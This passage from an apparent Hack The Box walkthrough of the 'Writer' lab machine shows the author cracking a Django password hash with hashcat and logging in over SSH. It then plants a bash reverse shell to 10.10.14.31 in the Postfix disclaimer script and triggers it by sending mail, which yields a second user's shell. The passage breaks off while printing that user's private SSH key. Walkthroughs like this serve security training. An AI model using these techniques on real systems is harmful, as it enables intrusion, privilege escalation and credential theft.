<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Writer$ hashcat -a 0 -m 10000 <span class="built_in">hash</span> --wordlist /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">=============================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-Intel(R) Pentium(R) CPU  N3700  @ 1.60GHz, 1392/1456 MB (512 MB allocatable), 2MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Slow-Hash-SIMD-LOOP</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 64 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD<span class="variable">$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A</span>=:marcoantonio</span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: Django (PBKDF2-SHA256)</span><br><span class="line">Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD<span class="variable">$bbTyCB8</span>...uXM4A=</span><br><span class="line">Time.Started.....: Thu Aug  5 02:46:45 2021 (18 mins, 29 secs)</span><br><span class="line">Time.Estimated...: Thu Aug  5 03:05:14 2021 (0 secs)</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:        8 H/s (3.11ms) @ Accel:32 Loops:128 Thr:1 Vec:4</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 9408/14344385 (0.07%)</span><br><span class="line">Rejected.........: 0/9408 (0.00%)</span><br><span class="line">Restore.Point....: 9344/14344385 (0.07%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:259968-259999</span></span><br><span class="line">Candidates.<span class="comment">#1....: jodete -&gt; 120287</span></span><br><span class="line"></span><br><span class="line">Started: Thu Aug  5 02:46:39 2021</span><br><span class="line">Stopped: Thu Aug  5 03:05:16 2021</span><br></pre></td></tr></table></figure>
<p>and we have the password let’s ssh as kyle.</p>
<h1 id="Kyle-to-John"><a href="#Kyle-to-John" class="headerlink" title="Kyle to John"></a>Kyle to John</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/writer]</span><br><span class="line">└─<span class="comment"># ssh kyle@writer.htb</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;writer.htb (10.10.11.101)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:GX5VjVDTWG6hUw9+T11QNDaoU0z5z9ENmryyyroNIBI.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>writer.htb<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">kyle@writer.htb&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri  6 Aug 08:33:05 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:           0.18</span><br><span class="line">  Usage of /:            64.5% of 6.82GB</span><br><span class="line">  Memory usage:          23%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             258</span><br><span class="line">  Users logged <span class="keyword">in</span>:       0</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0: 10.10.11.101</span><br><span class="line">  IPv6 address <span class="keyword">for</span> eth0: dead:beef::250:56ff:feb9:a196</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You have new mail.</span><br><span class="line">Last login: Fri Aug  6 04:49:11 2021 from 10.10.14.4</span><br><span class="line">kyle@writer:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(kyle) gid=1000(kyle) <span class="built_in">groups</span>=1000(kyle),997(filter),1002(smbgroup)</span><br><span class="line">kyle@writer:~$ <span class="built_in">whoami</span></span><br><span class="line">kyle</span><br><span class="line">kyle@writer:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">49b120a997fc7fdd05ad84575c2f5477</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2065.jpg"></li>
</ul>
<h2 id="Enumeration-2"><a href="#Enumeration-2" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Pspy64"><a href="#Pspy64" class="headerlink" title="Pspy64"></a>Pspy64</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipe -n dfilt -t unix flags=Rq user=john argv=/etc/postfix/disclaimer -f <span class="variable">$&#123;sender&#125;</span> -- <span class="variable">$&#123;recipient&#125;</span> </span><br><span class="line">/bin/sh /etc/postfix/disclaimer -f kyle@writer.htb -- kyle@writer.htb</span><br><span class="line">python3 sendmail.py</span><br></pre></td></tr></table></figure>

<p>This were the few intresting thing from pspy64 so now let’s understand how sendmail works.<br>There are few files we have to check to understand what is happening around so first let’s check disclaimer.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">kyle@writer:~$ <span class="built_in">cat</span> disclaimer</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Localize these.</span></span><br><span class="line"></span><br><span class="line">INSPECT_DIR=/var/spool/filter</span><br><span class="line">SENDMAIL=/usr/sbin/sendmail</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get disclaimer addresses</span></span><br><span class="line">DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit codes from &lt;sysexits.h&gt;</span></span><br><span class="line">EX_TEMPFAIL=75</span><br><span class="line">EX_UNAVAILABLE=69</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clean up when done or when aborting.</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f in.$$&quot;</span> 0 1 2 3 15</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start processing.</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$INSPECT_DIR</span> || &#123; <span class="built_in">echo</span> <span class="variable">$INSPECT_DIR</span> does not exist; <span class="built_in">exit</span></span><br><span class="line"><span class="variable">$EX_TEMPFAIL</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="keyword">in</span>.$$ || &#123; <span class="built_in">echo</span> Cannot save mail to file; <span class="built_in">exit</span> <span class="variable">$EX_TEMPFAIL</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># obtain From address</span></span><br><span class="line">from_address=`grep -m 1 <span class="string">&quot;From:&quot;</span> <span class="keyword">in</span>.$$ | <span class="built_in">cut</span> -d <span class="string">&quot;&lt;&quot;</span> -f 2 | <span class="built_in">cut</span> -d <span class="string">&quot;&gt;&quot;</span> -f 1`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ `grep -wi ^<span class="variable">$&#123;from_address&#125;</span>$ <span class="variable">$&#123;DISCLAIMER_ADDRESSES&#125;</span>` ]; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/altermime --input=<span class="keyword">in</span>.$$ \</span><br><span class="line">                   --disclaimer=/etc/postfix/disclaimer.txt \</span><br><span class="line">                   --disclaimer-html=/etc/postfix/disclaimer.txt \</span><br><span class="line">                   --xheader=<span class="string">&quot;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&quot;</span> || \</span><br><span class="line">                    &#123; <span class="built_in">echo</span> Message content rejected; <span class="built_in">exit</span> <span class="variable">$EX_UNAVAILABLE</span>; &#125;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$SENDMAIL</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span> &lt;<span class="keyword">in</span>.$$</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> $?</span><br></pre></td></tr></table></figure>

<p>Looks like we have a bash script that gets executed to get some sanity checks when we send a mail so let’s add a revshell line in it and then trigger it.</p>
<p>EDITED DISCLAIMER FILE.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">kyle@writer:~$ <span class="built_in">cat</span> disclaimer</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Localize these.</span></span><br><span class="line"></span><br><span class="line">bash -i &amp;&gt;/dev/tcp/10.10.14.31/1234 0&gt;&amp;1</span><br><span class="line">INSPECT_DIR=/var/spool/filter</span><br><span class="line">SENDMAIL=/usr/sbin/sendmail</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get disclaimer addresses</span></span><br><span class="line">DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit codes from &lt;sysexits.h&gt;</span></span><br><span class="line">EX_TEMPFAIL=75</span><br><span class="line">EX_UNAVAILABLE=69</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clean up when done or when aborting.</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f in.$$&quot;</span> 0 1 2 3 15</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start processing.</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$INSPECT_DIR</span> || &#123; <span class="built_in">echo</span> <span class="variable">$INSPECT_DIR</span> does not exist; <span class="built_in">exit</span></span><br><span class="line"><span class="variable">$EX_TEMPFAIL</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="keyword">in</span>.$$ || &#123; <span class="built_in">echo</span> Cannot save mail to file; <span class="built_in">exit</span> <span class="variable">$EX_TEMPFAIL</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># obtain From address</span></span><br><span class="line">from_address=`grep -m 1 <span class="string">&quot;From:&quot;</span> <span class="keyword">in</span>.$$ | <span class="built_in">cut</span> -d <span class="string">&quot;&lt;&quot;</span> -f 2 | <span class="built_in">cut</span> -d <span class="string">&quot;&gt;&quot;</span> -f 1`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ `grep -wi ^<span class="variable">$&#123;from_address&#125;</span>$ <span class="variable">$&#123;DISCLAIMER_ADDRESSES&#125;</span>` ]; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/altermime --input=<span class="keyword">in</span>.$$ \</span><br><span class="line">                   --disclaimer=/etc/postfix/disclaimer.txt \</span><br><span class="line">                   --disclaimer-html=/etc/postfix/disclaimer.txt \</span><br><span class="line">                   --xheader=<span class="string">&quot;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&quot;</span> || \</span><br><span class="line">                    &#123; <span class="built_in">echo</span> Message content rejected; <span class="built_in">exit</span> <span class="variable">$EX_UNAVAILABLE</span>; &#125;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$SENDMAIL</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span> &lt;<span class="keyword">in</span>.$$</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> $?</span><br></pre></td></tr></table></figure>

<p>Now let’s copy this file to &#x2F;etc&#x2F;postfix.<br>And then try to send mail you can do it manually using nc and telnet.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kyle@writer:/dev/shm$ <span class="built_in">cp</span> disclaimer /etc/postfix/disclaimer</span><br><span class="line">kyle@writer:/dev/shm$ nc 127.0.0.1 25</span><br><span class="line">220 writer.htb ESMTP Postfix (Ubuntu)</span><br><span class="line">HELO writer.htb                </span><br><span class="line">250 writer.htb</span><br><span class="line">MAIL FROM: kyle@writer.htb</span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">RCPT TO: john@writer.htb</span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">DATA</span><br><span class="line">From: kyle@writer.htb</span><br><span class="line">To: john@writer.htb</span><br><span class="line">Subject: Test</span><br><span class="line">Date: Thu, 20 Dec 2012 12:00:00 +0000</span><br><span class="line"></span><br><span class="line">Testing</span><br><span class="line">.354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line"></span><br><span class="line">250 2.0.0 Ok: queued as 41B40838</span><br><span class="line">QUIT</span><br><span class="line">221 2.0.0 Bye</span><br><span class="line">EXIT</span><br><span class="line">kyle@writer:/dev/shm$ </span><br></pre></td></tr></table></figure>

<p>But to be fast and not doing it repeatedly I wrote a simple python script to do this stuff for me.</p>
<ul>
<li>send.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">25</span></span><br><span class="line"></span><br><span class="line">From = <span class="string">&#x27;kyle@writer.htb&#x27;</span></span><br><span class="line">To = <span class="string">&#x27;john@writer.htb&#x27;</span></span><br><span class="line"></span><br><span class="line">Message = <span class="string">&#x27;&#x27;&#x27;\</span></span><br><span class="line"><span class="string">        Subject: HI THERE! JOHN</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        OOPS I GOT YOU MATE.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        io = smtplib.SMTP(host,port)</span><br><span class="line">        io.ehlo()</span><br><span class="line">        io.sendmail(From,To,Message)</span><br><span class="line"><span class="keyword">except</span> Exceptions <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> (e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">        io.quit()</span><br></pre></td></tr></table></figure>

<p>and then run the following command.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kyle@writer:/tmp$ <span class="built_in">cp</span> disclaimer /etc/postfix/disclaimer &amp;&amp; python3 send.py</span><br></pre></td></tr></table></figure>

<p>the disclaimer is the edited disclaimer file and then sending mail.<br>and boom we have shell as john.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/writer]</span><br><span class="line">└─<span class="comment"># nc -lvp 1234                                                                                                                  </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234</span><br><span class="line">Ncat: Connection from 10.10.11.101.</span><br><span class="line">Ncat: Connection from 10.10.11.101:47120.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (13385): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">john@writer:/var/spool/postfix$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(john) gid=1001(john) <span class="built_in">groups</span>=1001(john)</span><br><span class="line">john@writer:/var/spool/postfix$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">john</span><br></pre></td></tr></table></figure>

<h1 id="PrivESC"><a href="#PrivESC" class="headerlink" title="PrivESC"></a>PrivESC</h1><h2 id="Stabilizing-the-shell"><a href="#Stabilizing-the-shell" class="headerlink" title="Stabilizing the shell"></a>Stabilizing the shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">john@writer:/var/spool/postfix$ <span class="built_in">cd</span> /home/john</span><br><span class="line">john@writer:/var/spool/postfix$ <span class="built_in">ls</span> -al</span><br><span class="line">drwxr-xr-x 4 john john 4096 Aug  5 10:19 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 May 19 22:20 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 john john  220 May 14 18:19 .bash_logout</span><br><span class="line">-rw-r--r-- 1 john john 3771 May 14 18:19 .bashrc</span><br><span class="line">drwx------ 2 john john 4096 Jul 28 09:19 .cache</span><br><span class="line">-rw-r--r-- 1 john john  807 May 14 18:19 .profile</span><br><span class="line">drwx------ 2 john john 4096 Jul  9 12:29 .ssh</span><br><span class="line">-rw------- 1 john john 2751 Aug  5 10:19 .viminfo</span><br><span class="line">john@writer:/var/spool/postfix$ <span class="built_in">cd</span> .ssh</span><br><span class="line">john@writer:/var/spool/postfix$ <span class="built_in">ls</span></span><br><span class="line">authorized_keys</span><br><span class="line">id_rsa</span><br><span class="line">id_rsa.pub</span><br><span class="line">john@writer:/var/spool/postfix$ <span class="built_in">cat</span> id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAxqOWLbG36VBpFEz2ENaw0DfwMRLJdD3QpaIApp27SvktsWY3hOJz</span><br><span class="line">wC4+LHoqnJpIdi/qLDnTx5v8vB67K04f+4FJl2fYVSwwMIrfc/+CHxcTrrw+uIRVIiUuKF</span><br><span class="line">OznaG7QbqiFE1CsmnNAf7mz4Ci5VfkjwfZr18rduaUXBdNVIzPwNnL48wzF1QHgVnRTCB3</span><br><span class="line">i76pHSoZEA0bMDkUcqWuI0Z+3VOZlhGp0/v2jr2JH/uA6U0g4Ym8vqgwvEeTk1gNPIM6fg</span><br><span class="line">9xEYMUw+GhXQ5Q3CPPAVUaAfRDSivWtzNF1XcELH1ofF+ZY44vcQppovWgyOaw2fAHW6ea</span><br><span class="line">TIcfhw3ExT2VSh7qm39NITKkAHwoPQ7VJbTY0Uj87+j6RV7xQJZqOG0ASxd4Y1PvKiGhke</span><br><span class="line">tFOd6a2m8cpJwsLFGQNtGA4kisG8m//aQsZfllYPI4n4A1pXi/7NA0E4cxNH+xt//ZMRws</span><br><span class="line">sfahK65k6+Yc91qFWl5R3Zw9wUZl/G10irJuYXUDAAAFiN5gLYDeYC2AAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAMajli2xt+lQaRRM9hDWsNA38DESyXQ90KWiAKadu0r5LbFmN4Tic8AuPix6Kpya</span><br><span class="line">SHYv6iw508eb/LweuytOH/uBSZdn2FUsMDCK33P/gh8XE668PriEVSIlLihTs52hu0G6oh</span><br><span class="line">RNQrJpzQH+5s+AouVX5I8H2a9fK3bmlFwXTVSMz8DZy+PMMxdUB4FZ0Uwgd4u+qR0qGRAN</span><br><span class="line">GzA5FHKlriNGft1TmZYRqdP79o69iR/7gOlNIOGJvL6oMLxHk5NYDTyDOn4PcRGDFMPhoV</span><br><span class="line">0OUNwjzwFVGgH0Q0or1rczRdV3BCx9aHxfmWOOL3EKaaL1oMjmsNnwB1unmkyHH4cNxMU9</span><br><span class="line">lUoe6pt/TSEypAB8KD0O1SW02NFI/O/o+kVe8UCWajhtAEsXeGNT7yohoZHrRTnemtpvHK</span><br><span class="line">ScLCxRkDbRgOJIrBvJv/2kLGX5ZWDyOJ+ANaV4v+zQNBOHMTR/sbf/2TEcLLH2oSuuZOvm</span><br><span class="line">HPdahVpeUd2cPcFGZfxtdIqybmF1AwAAAAMBAAEAAAGAZMExObg9SvDoe82VunDLerIE+T</span><br><span class="line">9IQ9fe70S/A8RZ7et6S9NHMfYTNFXAX5sP5iMzwg8HvqsOSt9KULldwtd7zXyEsXGQ/5LM</span><br><span class="line">VrL6KMJfZBm2eBkvzzQAYrNtODNMlhYk/3AFKjsOK6USwYJj3Lio55+vZQVcW2Hwj/zhH9</span><br><span class="line">0J8msCLhXLH57CA4Ex1WCTkwOc35sz+IET+VpMgidRwd1b+LSXQPhYnRAUjlvtcfWdikVt</span><br><span class="line">2+itVvkgbayuG7JKnqA4IQTrgoJuC/s4ZT4M8qh4SuN/ANHGohCuNsOcb5xp/E2WmZ3Gcm</span><br><span class="line">bB0XE4BEhilAWLts4yexGrQ9So+eAXnfWZHRObhugy88TGy4v05B3z955EWDFnrJX0aMXn</span><br><span class="line">l6N71m/g5XoYJ6hu5tazJtaHrZQsD5f71DCTLTSe1ZMwea6MnPisV8O7PC/PFIBP+5mdPf</span><br><span class="line">3RXx0i7i5rLGdlTGJZUa+i/vGObbURyd5EECiS/Lpi0dnmUJKcgEKpf37xQgrFpTExAAAA</span><br><span class="line">wQDY6oeUVizwq7qNRqjtE8Cx2PvMDMYmCp4ub8UgG0JVsOVWenyikyYLaOqWr4gUxIXtCt</span><br><span class="line">A4BOWMkRaBBn+3YeqxRmOUo2iU4O3GQym3KnZsvqO8MoYeWtWuL+tnJNgDNQInzGZ4/SFK</span><br><span class="line">23cynzsQBgb1V8u63gRX/IyYCWxZOHYpQb+yqPQUyGcdBjpkU3JQbb2Rrb5rXWzUCzjQJm</span><br><span class="line">Zs9F7wWV5O3OcDBcSQRCSrES3VxY+FUuODhPrrmAtgFKdkZGYAAADBAPSpB9WrW9cg0gta</span><br><span class="line">9CFhgTt/IW75KE7eXIkVV/NH9lI4At6X4dQTSUXBFhqhzZcHq4aXzGEq4ALvUPP9yP7p7S</span><br><span 